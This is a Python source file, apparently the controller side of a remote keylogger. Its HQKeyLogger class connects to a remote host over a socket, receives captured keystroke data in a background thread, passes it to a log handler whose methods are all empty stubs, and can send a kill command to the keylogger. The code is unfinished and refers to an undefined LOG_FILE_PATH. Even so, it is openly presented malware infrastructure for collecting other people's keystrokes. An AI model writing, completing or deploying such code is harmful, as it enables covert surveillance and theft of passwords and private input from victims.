from Universal import ClientSocketHandler
from Universal.constants import KeyLoggerConstants as consts
from threading import Thread


class LogDataHandler(object):
    def __init__(self, log_file_path):
        self.log_file_path = log_file_path

    def _create_log_file(self):
        pass

    def _log_in_log_file(self):
        pass

    def _print_to_output_window(self):
        pass

    def handle_log_data(self, log_data):
        pass


class HQKeyLogger(object):
    def __init__(self, hostname, port, socket_timeout):
        self.hostname = hostname
        self.port = port
        self._socket_timeout = socket_timeout
        self._socket = None # to be assigned in 'connect' method
        self._log_data_handler = None # to be assigned in 'connect' method
        self._log_data_handling_thread = None # to be assigned in 'mainloop' method
        self._keep_alive = None

    def connect(self):
        self._socket = ClientSocketHandler(self.port, self.hostname, self._socket_timeout)
        self._log_data_handler = LogDataHandler(LOG_FILE_PATH)

    def _receive_and_handle_log_data(self):
        while self._keep_alive:
            key_log_data = self._socket.receive_data(print_progress=False)
            self._log_data_handler.handle_log_data(key_log_data)

    def mainloop(self):
        self._log_data_handling_thread = Thread(target=self._receive_and_handle_log_data)
        self._keep_alive = True
        self._log_data_handling_thread.start()

    def terminate(self):
        self._keep_alive = False
        self._log_data_handling_thread.join() # wait for thread to terminate
        self._socket.send_data(consts.KILL_KEYLOGGER_MSG) # tell kli keylogger to terminate
        self._socket.terminate()


